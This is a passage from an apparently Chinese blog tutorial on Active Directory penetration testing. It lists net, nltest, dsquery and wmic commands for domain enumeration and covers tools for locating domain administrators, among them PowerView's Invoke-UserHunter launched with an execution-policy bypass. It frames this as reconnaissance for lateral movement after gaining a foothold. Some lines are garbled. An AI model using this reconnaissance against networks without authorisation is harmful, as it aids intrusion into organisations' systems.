<h4 id="net-localgroup"><a href="#net-localgroup" class="headerlink" title="net localgroup"></a>net localgroup</h4><p>添加、显示或更改本地组。</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">命令格式：`Net localgroup groupname &#123;/add [/comment:</span><span class="hljs-string">&quot;text &quot;</span>] | /delete&#125; [/domain]`<br>有关参数说明：<br>∙键入不带参数的`Net localgroup`显示服务器名称和计算机的本地组名称<br>∙`groupname`要添加、扩充或删除的本地组名称<br><span class="hljs-title">∙`/comment:</span> <span class="hljs-string">&quot;text &quot;</span>`为新建或现有组添加注释<br>∙`/domain`在当前域的主域控制器中执行操作，否则仅在本地计算机上执行操作<br>∙`name [ ...]`列出要添加到本地组或从本地组中删除的一个或多个用户名或组名<br>∙`/add`将全局组名或用户名添加到本地组中<br>∙`/delete`从本地组中删除组名或用户名<br>例如：`Net localgroup ggg /add` 将名为ggg的本地组添加到本地用户帐号数据库；<br>`Net localgroup Administrator` 显示Administrator本地组中的用户。<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007101541784.png" srcset="/img/loading.gif" lazyload alt="image-20231007101541784"></p>
<p><img src="/img/image-20231007101929047.png" srcset="/img/loading.gif" lazyload alt="image-20231007101929047"></p>
<p>当域控想创建这台计算机的管理员用户时，只需要创建用户然后将其加入到domain admins组中即可 </p>
<h4 id="net-group"><a href="#net-group" class="headerlink" title="net group"></a>net group</h4><p>在 Windows NT&#x2F;2000&#x2F;2003 Server 域中添加、显示或更改全局组。</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">命令格式：`Net group groupname &#123;/add [/comment:</span><span class="hljs-string">&quot;text &quot;</span>] | /delete&#125; [/domain]`<br>有关参数说明：<br>∙键入不带参数的Net group显示服务器名称及服务器的组名称<br>∙`groupname`要添加、扩展或删除的组<br><span class="hljs-title">∙`/comment:</span><span class="hljs-string">&quot;text &quot;</span>`为新建组或现有组添加注释<br>∙`/domain`在当前域的主域控制器中执行该操作，否则在本地计算机上执行操作<br>∙`username[ ...]`列表显示要添加到组或从组中删除的一个或多个用户<br>∙`/add`添加组或在组中添加用户名<br>∙`/delete`删除组或从组中删除用户名<br>例如：`Net group ggg GHQ1 GHQ2 /add`将现有用户帐号GHQ1和GHQ2添加到本地计算机的ggg组<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007102532660.png" srcset="/img/loading.gif" lazyload alt="image-20231007102532660"></p>
<h4 id="net-file"><a href="#net-file" class="headerlink" title="net file"></a>net file</h4><p>显示某服务器上所有打开的共享文件名及锁定文件数。</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">命令格式：`<span class="hljs-keyword">Net</span> <span class="hljs-keyword">file</span> [id [/<span class="hljs-keyword">close</span>]]`<br>有关参数说明：<br>∙键入不带参数的<span class="hljs-keyword">Net</span> <span class="hljs-keyword">file</span>获得服务器上打开文件的列表<br>∙`id`文件标识号<br>∙/<span class="hljs-keyword">close</span>关闭打开的文件并释放锁定记录<br></code></pre></td></tr></table></figure>

<h4 id="net-config"><a href="#net-config" class="headerlink" title="net config"></a>net config</h4><p>显示当前运行的可配置服务，或显示并更改某项服务的设置。</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">命令格式：`Net config [service [options]]`<br>有关参数说明：<br>∙键入不带参数的Net config显示可配置服务的列表<br>∙`service`通过Net config命令进行配置的服务(server或workstation)<br>`options`服务的特定选项<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007104619600.png" srcset="/img/loading.gif" lazyload alt="image-20231007104619600"></p>
<h4 id="net-computer"><a href="#net-computer" class="headerlink" title="net computer"></a>net computer</h4><p>从域数据库中添加或删除计算机</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">命令格式：Net computer \computername &#123;/add | /del&#125;<br>有关参数说明：<br>∙\\computername指定要添加到域或从域中删除的计算机<br>∙/add将指定计算机添加到域<br>∙/del将指定计算机从域中删除<br>例如：Net computer \\js /add将计算机js 添加到登录域。<br></code></pre></td></tr></table></figure>

<h3 id="②查询域"><a href="#②查询域" class="headerlink" title="②查询域"></a>②查询域</h3><p>查询域的命令如下 </p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">net <span class="hljs-built_in">view</span> /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure>

<p>如果出现”此工作组的服务器列表当前无法使用” 开启服务：Server ，WorkStation，computer Browser,关闭防火墙</p>
<p><img src="/img/image-20231007104912481.png" srcset="/img/loading.gif" lazyload alt="image-20231007104912481"></p>
<h3 id="③查询域内所有计算机"><a href="#③查询域内所有计算机" class="headerlink" title="③查询域内所有计算机"></a>③查询域内所有计算机</h3><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">net <span class="hljs-built_in">view</span>/<span class="hljs-built_in">domain</span>:域名<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007105005557.png" srcset="/img/loading.gif" lazyload alt="image-20231007105005557"></p>
<h3 id="④查询域内所有用户组列表"><a href="#④查询域内所有用户组列表" class="headerlink" title="④查询域内所有用户组列表"></a>④查询域内所有用户组列表</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">/domain</span>	注意：只有域用户才能查询<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007105243145.png" srcset="/img/loading.gif" lazyload alt="image-20231007105243145"></p>
<p>系统自带的常见用户身份如下：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Domain</span> Admins:域管理员。<br><span class="hljs-keyword">Domain</span> Computers:域内机器。<br><span class="hljs-keyword">Domain</span> Controllers:域控制器。<br><span class="hljs-keyword">Domain</span> Gusers:域访客,权限较低。<br><span class="hljs-keyword">Domain</span> <span class="hljs-keyword">User</span>:域用户。<br>Enterprise Admins:企业系统管理员用户<br>在默认情况下, <span class="hljs-keyword">Domain</span> admins和Enterprise Admins对域内所有域控制器有完全控制权限<br></code></pre></td></tr></table></figure>

<h3 id="⑤查询所有域成员计算机列表"><a href="#⑤查询所有域成员计算机列表" class="headerlink" title="⑤查询所有域成员计算机列表"></a>⑤查询所有域成员计算机列表</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;domain</span> computers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007105719426.png" srcset="/img/loading.gif" lazyload alt="image-20231007105719426"></p>
<h3 id="⑥获取域密码信息"><a href="#⑥获取域密码信息" class="headerlink" title="⑥获取域密码信息"></a>⑥获取域密码信息</h3><p>执行如下命令’获取域密码策略、密码长度、错误锁定等信息</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">net accounts /<span class="hljs-built_in">domain</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007105946134.png" srcset="/img/loading.gif" lazyload alt="image-20231007105946134"></p>
<h3 id="⑦获取域信任信息"><a href="#⑦获取域信任信息" class="headerlink" title="⑦获取域信任信息"></a>⑦获取域信任信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nltest /domain_trusts<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007110006792.png" srcset="/img/loading.gif" lazyload alt="image-20231007110006792"></p>
<h2 id="2-域环境中查找DC的多种方式"><a href="#2-域环境中查找DC的多种方式" class="headerlink" title="2.域环境中查找DC的多种方式"></a>2.域环境中查找DC的多种方式</h2><h3 id="查看域控制器的机器名"><a href="#查看域控制器的机器名" class="headerlink" title="查看域控制器的机器名"></a>查看域控制器的机器名</h3><p>执行如下命令,可以看到,域控制器的机器名</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">nltest /DCLIST:hack<br>获取域控的ip：<br>ping DC<span class="hljs-selector-class">.hack</span><span class="hljs-selector-class">.com</span><br>nslookup DC<span class="hljs-selector-class">.hack</span>.com<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007111132686.png" srcset="/img/loading.gif" lazyload alt="image-20231007111132686"></p>
<p><img src="/img/image-20231007111253023.png" srcset="/img/loading.gif" lazyload alt="image-20231007111253023"></p>
<h3 id="查看域控制器的主机名"><a href="#查看域控制器的主机名" class="headerlink" title="查看域控制器的主机名"></a>查看域控制器的主机名</h3><p>执行如下命令,可以看到,域控制器的主机名</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">nslookup -<span class="hljs-built_in">type</span>=SRV <span class="hljs-variable">_ldap</span>.<span class="hljs-variable">_tcp</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007111503042.png" srcset="/img/loading.gif" lazyload alt="image-20231007111503042"></p>
<h3 id="查看当前时间"><a href="#查看当前时间" class="headerlink" title="查看当前时间"></a>查看当前时间</h3><p>在通常情况下,<strong>时间服务器为主域控制器</strong>。执行如下命令</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007111614338.png" srcset="/img/loading.gif" lazyload alt="image-20231007111614338"></p>
<h3 id="查看域控制器组"><a href="#查看域控制器组" class="headerlink" title="查看域控制器组"></a>查看域控制器组</h3><p>执行如下命令,查看域控制器组。,其中有一台机器名为”DC”的域控制器</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;Domain</span> Controllers<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007111644401.png" srcset="/img/loading.gif" lazyload alt="image-20231007111644401"></p>
<p>在实际网络中,一个域内一般存在两台或两台以上的域控制器,其目的是:一旦主域控制器发生故障,备用的域控制器可以保证域内的服务和验证工作正常进行</p>
<h2 id="3-域环境中查找域内用户信息"><a href="#3-域环境中查找域内用户信息" class="headerlink" title="3.域环境中查找域内用户信息"></a>3.域环境中查找域内用户信息</h2><h3 id="向域控制器进行查询"><a href="#向域控制器进行查询" class="headerlink" title="向域控制器进行查询"></a>向域控制器进行查询</h3><p>执行如下命令,向域控制器DC进行查询,,域内有多个用户。其中,krbtgt 用户不仅可以创建票据授权服务(TGS)的加密 密钥,还可以实现多种域内权限持久化方法</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">/domain</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007145023930.png" srcset="/img/loading.gif" lazyload alt="image-20231007145023930"></p>
<h3 id="获取域内用户详细信息"><a href="#获取域内用户详细信息" class="headerlink" title="获取域内用户详细信息"></a>获取域内用户详细信息</h3><p>wmic可以获取域内用户的详细常见参数包括用户名、描述信息、SID、域名、状态等</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /?  查看帮助<br>wmic useraccount <span class="hljs-keyword">get</span> <span class="hljs-type">name</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007150154499.png" srcset="/img/loading.gif" lazyload alt="image-20231007150154499"></p>
<p><img src="/img/image-20231007150231829.png" srcset="/img/loading.gif" lazyload alt="image-20231007150231829"></p>
<h3 id="查看存在的用户"><a href="#查看存在的用户" class="headerlink" title="查看存在的用户"></a>查看存在的用户</h3><p>执行如下命令,可以看到,域内用户（server机器有这个命令）</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">dsquery <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure>

<p>常用的 dsquery命令：</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">dsquery computer ‐查找目录中的计算<br>dsquery contact ‐查找目录中的职系人<br>dsquery subnet ‐目录中的子网<br>dsquery <span class="hljs-keyword">group</span> <span class="hljs-title">‐查找目录中的组,</span><br><span class="hljs-title">dsquery</span> ou ‐查找目录中的组织单位,<br>dsquery site ‐最找目景中的站成<br>dsquery server ‐查找目录中的ADDC/LDs实例<br>asquery <span class="hljs-keyword">user</span> <span class="hljs-title">‐查找目录中的用户</span><br><span class="hljs-title">dsquery</span> quota ‐查找目录中的配颗机定<br>dsquery partition ‐查找目录中的分区<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007151306581.png" srcset="/img/loading.gif" lazyload alt="image-20231007151306581"></p>
<p><img src="/img/image-20231007151443777.png" srcset="/img/loading.gif" lazyload alt="image-20231007151443777"></p>
<h3 id="查询域管理用户"><a href="#查询域管理用户" class="headerlink" title="查询域管理用户"></a>查询域管理用户</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> localgroup administrators<br></code></pre></td></tr></table></figure>

<p>Domain admin组中的用户默认为域内机器的本地管理员用户 在实际应用中’为了方便管理 会有域用户被设置为域 机器的本地管理员用户</p>
<p><img src="/img/image-20231007151614534.png" srcset="/img/loading.gif" lazyload alt="image-20231007151614534"></p>
<h3 id="查询域管理员用户组"><a href="#查询域管理员用户组" class="headerlink" title="查询域管理员用户组"></a>查询域管理员用户组</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">group</span> <span class="hljs-title">&quot;Enterprise</span> Admins<span class="hljs-string">&quot; /domain</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007151705203.png" srcset="/img/loading.gif" lazyload alt="image-20231007151705203"></p>
<h2 id="4-定位域管理员"><a href="#4-定位域管理员" class="headerlink" title="4.定位域管理员"></a>4.定位域管理员</h2><p>在内网中，通常会部署大址的网络安全系统和设备,例如IDS、IPS、日志审计、安全网关、 反病毒软件等。在域网 络攻击测试中,获取域内的一个支点后，需要获取域管理员权限. 在一个域中，当计算机加入域后，会默认给域管理 员组赋予本地系统管理员权限,也就是说, <strong>当主机被添加到域中.成为域的成员主机后，系统会自动将域管理员组添加到该计算机的本地系统管理员组中，因此域管理员组的成员都可以访问本地计算机，且具备安全控制权限</strong> </p>
<p>定位域内管理员的常规渠道，一是日志，二是会话。日志是指本地机器的管理员日志，会话是指域内每台机器的登 录会话 </p>
<p>假设已经在Windows域中取得了普通用户权限，希望在域内横向移动，需要知道域内用户登录的位置、他是否是 任何系统的本地管理员、他所属的组、他是否有权访问文件共享等。枚举主机、用户和组，有助于更好地了解域的 布局。</p>
<h3 id="手动定位域管理员"><a href="#手动定位域管理员" class="headerlink" title="手动定位域管理员"></a>手动定位域管理员</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span> 查看当前域名<br>net <span class="hljs-keyword">view</span> /<span class="hljs-keyword">domain</span>:域名 查看域内部所有计算机名<br>net <span class="hljs-keyword">group</span> /<span class="hljs-keyword">domain</span> 查看域内部所有用户组列表<br>net <span class="hljs-keyword">group</span> &quot;domain computers&quot; /<span class="hljs-keyword">domain</span> 查看所有域成员计算机列表<br>net accounts /<span class="hljs-keyword">domain</span> 查看域密码信息<br>nltest /domian_trusts 获取域信任信息<br>nltest /DCLIST:域名 查看域控制器机器名<br>net <span class="hljs-type">time</span> /<span class="hljs-keyword">domain</span> 查看当前时间，因为时间服务器也是主域服务器，可以看到域服务器的机器名<br>net <span class="hljs-keyword">group</span> &quot;Domain Controllers&quot; /<span class="hljs-keyword">domain</span> 查看域控制器组，因为可能有不止一台域控，有主备之分<br>net <span class="hljs-keyword">user</span> /<span class="hljs-keyword">domain</span> 查询域内用户，会看到熟悉的krbtgt用户<br>wmic useraccount <span class="hljs-keyword">get</span> /<span class="hljs-keyword">all</span> 获取域内用户详细信息<br>dsquery <span class="hljs-keyword">user</span> 查看域内存在的用户<br>net localgroup administrators 查看本地管理员用户组<br>net <span class="hljs-keyword">group</span> &quot;domain admins&quot; /<span class="hljs-keyword">domain</span> 查询域管理员用户<br></code></pre></td></tr></table></figure>

<h3 id="psloggedon-exe工具"><a href="#psloggedon-exe工具" class="headerlink" title="psloggedon.exe工具"></a>psloggedon.exe工具</h3><p>psloggedon.exe 可以<strong>显示本地登录的用户和通过本地计算机或远程计算机的资源登录的用户</strong>。如果指定了用户名 而不是计算机，psloggedon.exe 会搜索网络邻居中的计算机，并显示该用户当前是否已登录。</p>
<p>首次使用：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">psloggedon<span class="hljs-selector-class">.exe</span> /accepteula<br>psloggedon<span class="hljs-selector-class">.exe</span> \\PC-<span class="hljs-number">2003</span><br>psloggedon<span class="hljs-selector-class">.exe</span> jack<br></code></pre></td></tr></table></figure>

<img src="/img/image-20231007155245879.png" srcset="/img/loading.gif" lazyload alt="image-20231007155245879" style="zoom:80%;" />

<h3 id="PVEDFindADUser-exe工具"><a href="#PVEDFindADUser-exe工具" class="headerlink" title="PVEDFindADUser.exe工具"></a>PVEDFindADUser.exe工具</h3><p>pveFindADUser.exe 可用于<strong>查找 Active Directory 用户登录的位置，枚举域用户，以及查找在特定计算机上登录的用户</strong>，包括本地用户、通过RDP登录的用户、用于运行服务和计划任务的用户账户。运行该工具的计算机需要 具有.NETFramework 2.0，并且需要具有管理员权限</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">‐h：显示帮助信息<br>‐<span class="hljs-keyword">current</span>[&quot;username&quot;]：如果仅指定‐<span class="hljs-keyword">current</span>参数，将获取目标计算机上当前登录的所有用户。如果指定了用户名<br>（Domain\Username），则显示该用户登录的计算机<br>‐<span class="hljs-keyword">last</span>[&quot;username&quot;]：如果仅指定‐<span class="hljs-keyword">last</span>参数，将获取目标计算机上最后一个登录用户。如果指定了用户名<br>（Domain\Username），则显示此用户上次登录的计算机。根据网络的安全策略，可能会隐藏最后一个登录用户的用户<br>名，此时使用该工具可能无法得到用户名<br>‐noping：阻止该工具在获取用户登陆信息之前对目标执行ping命令<br>‐target：可选参数，用于指定要查询的主机。如果未指定该参数，将查询域中的所有主机。如果指定了此参数，主机名<br>列表由逗号分隔<br>直接运行&quot;pvefindaduser.exe ‐current&quot;，即可显示域中所有计算机上当前登录的用户<br>PVEFindADUser.exe <span class="hljs-operator">-</span><span class="hljs-keyword">current</span> hack\jack  查看该用户在哪台计算机上登录<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007160021667.png" srcset="/img/loading.gif" lazyload alt="image-20231007160021667"></p>
<h3 id="netview-exe工具"><a href="#netview-exe工具" class="headerlink" title="netview.exe工具"></a>netview.exe工具</h3><p>netview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用NetSessionEnum找寻登陆会话，利NetShareEnum 找寻共享，利用NetWkstaUserEnum<strong>枚举登陆的用户</strong>。同时，netview.exe 能够查询共享入口和有价值的用户。 netview.exe的绝大部分功能不需要管理员权限就可以使用。</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sas">使用语法：<br>netview.exe &lt;参数&gt;<br>‐h：显示帮助菜单。<br>‐f <span class="hljs-keyword">filename</span>.txt：指定从中提取主机列表的文件。<br>‐e <span class="hljs-keyword">filename</span>.txt：指定要排除的主机名文件。<br>‐o <span class="hljs-keyword">filename</span>.txt：将所有输出重定向到文件。<br>‐d domain：指定从中提取主机列表的域。如果没有指定，则使用当前域。<br>‐g <span class="hljs-keyword">group</span>：指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。<br>‐c：检查对已找到共享的访问权限<br><br>netview.exe -d hack<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007160853211.png" srcset="/img/loading.gif" lazyload alt="image-20231007160853211"></p>
<h3 id="NSE脚本"><a href="#NSE脚本" class="headerlink" title="NSE脚本"></a>NSE脚本</h3><p>如果存在域账户或者本地账户就可以使用Nmap的smb-enum-sessions.nes引擎获取远程机器的登录会话（不需要管理员权限）。</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">smb‐<span class="hljs-keyword">enum</span>‐domain：对域控制器进行信息收集，可以获取主机的信息、用户、可使用密码策略的用户等<br>smb‐<span class="hljs-keyword">enum</span>‐users：在进行域渗透测试时，如果获得了域内某台主机的权限，无法获取更多的域用户信息，就可以借助这<br>个脚本对域控制器进行扫描<br>smb‐<span class="hljs-keyword">enum</span>‐shares：遍历远程主机的共享目录<br>smb‐<span class="hljs-keyword">enum</span>‐processes：对主机的系统进行遍历。通过这些信息，可以知道目标主机上正在运行哪些软件。<br>smb‐<span class="hljs-keyword">enum</span>‐sessions：获取域内主机的用户登录会话，查看当前是否有用户登录。<br>smb‐os‐discovery：收集目标主机的操作系统、计算机名、域名域林名称、NetBIOS机器名、NetBIOS域名，工作组、<br></code></pre></td></tr></table></figure>

<h3 id="PowerView脚本"><a href="#PowerView脚本" class="headerlink" title="PowerView脚本"></a>PowerView脚本</h3><p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、 Invoke-UserHunter 等，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell.exe -<span class="hljs-built_in">exec</span> bypass -<span class="hljs-built_in">command</span> <span class="hljs-string">&quot;&amp; &#123; import-module .\PowerView.ps1;Invoke-UserHunter&#125;&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007161535330.png" srcset="/img/loading.gif" lazyload alt="image-20231007161535330"></p>
<h2 id="5-powershell基础"><a href="#5-powershell基础" class="headerlink" title="5.powershell基础"></a>5.powershell基础</h2><p>Powershell 是运行在windows机器上实现系统和应用程序管理自动化的命令行脚本环境。可以把它看成是命令行提示符cmd.exe的扩充，不对，应当是颠覆。 powershell需要.NET环境的支持，同时支持.NET对象。微软之所以将Powershell 定位为Power，并不是夸大其词，因为它完全支持对象。其可读性，易用性，可以位居当前所有shell之首。 </p>
<p>当前powershell有四版本，分别为1.0， 2.0，3.0 ,4.0 如果您的系统是window7或者Windows Server 2008，那么PowerShell 2.0已经内置了，可以升级 为3.0，4.0。</p>
<p>如果您的系统是Windows 8 或者Windows server 2012，那么PowerShell 3.0已经内置了，可以升级为4.0。</p>
<p>如果您的系统为Windows 8.1或者Windows server 2012 R2，那默认已经是4.0了。</p>
<h3 id="管道和重定向"><a href="#管道和重定向" class="headerlink" title="管道和重定向"></a>管道和重定向</h3><p>例如通过ls获取当前目录的所有文件信息，然后通过Sort -Descending对文件信息按照Name降序排 列，最后将排序好的文件的Name和Mode格式化成Table输出</p>
<img src="/img/image-20231007165949569.png" srcset="/img/loading.gif" lazyload alt="image-20231007165949569" style="zoom:80%;" />

<p>把命令的输出保存到文件中，‘&gt;’为覆盖，’&gt;&gt;’追加</p>
<p><img src="/img/image-20231007170138792.png" srcset="/img/loading.gif" lazyload alt="image-20231007170138792"></p>
<h3 id="执行外部命令"><a href="#执行外部命令" class="headerlink" title="执行外部命令"></a>执行外部命令</h3><p>Powershell 能够像CMD一样很好的执行外部命令 </p>
<p>通过IPConfig查看自己的网络配置</p>
<p>通过netstat查看网络端口状态</p>
<p>启动CMD控制台</p>
<p>Cmd.exe 通过 &#x2F;c 来接收命令参数，在Cmd中help可以查看可用的命令，所以可以通过Cmd &#x2F;c  help 查找可用的Cmd控制台命令</p>
<h3 id="指定内部命令"><a href="#指定内部命令" class="headerlink" title="指定内部命令"></a>指定内部命令</h3><p>官方文档：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/powershell/?view=powershell-5.1">https://learn.microsoft.com/zh-cn/powershell/?view=powershell-5.1</a></p>
<p>每个命令有一个动词和名词组成，命令的作用一目了然</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Get</span>-<span class="hljs-keyword">Alias</span>  获取命令的别名<br></code></pre></td></tr></table></figure>

<img src="/img/image-20231007172220116.png" srcset="/img/loading.gif" lazyload alt="image-20231007172220116" style="zoom:80%;" />

<h3 id="powershell脚本"><a href="#powershell脚本" class="headerlink" title="powershell脚本"></a>powershell脚本</h3><p>Powershell一般初始化情况下都会禁止脚本执行。脚本能否执行取决于Powershell的执行策略</p>
<p>powershell脚本以ps1结尾</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">ExecutionPolicy</span> 查看权限<br><span class="hljs-variable">Unrestricted</span><span class="hljs-operator">:</span>权限最高，可以不受限制执行任何脚本。<br><span class="hljs-built_in">Default</span><span class="hljs-operator">:</span>为<span class="hljs-variable">Powershell</span>默认的策略：<span class="hljs-built_in">Restricted</span>，不允许任何脚本执行。<br><span class="hljs-variable">AllSigned</span>：所有脚本都必须经过签名才能在运行。<br><span class="hljs-variable">RemoteSigned</span>：本地脚本无限制，但是对来自网络的脚本必须经过签名<br></code></pre></td></tr></table></figure>

<p><img src="/img/image-20231007173051343.png" srcset="/img/loading.gif" lazyload alt="image-20231007173051343"></p>
<p>改变运行策略</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-ExecutionPolicy <span class="hljs-comment">Unrestricted</span><br></code></pre></td></tr></table></figure>

<img src="/img/image-20231007173158318.png" srcset="/img/loading.gif" lazyload alt="image-20231007173158318" style="zoom: 80%;" />

<p>脚本测试：</p>
<img src="/img/image-20231007173427268.png" srcset="/img/loading.gif" lazyload alt="image-20231007173427268" style="zoom:80%;" />



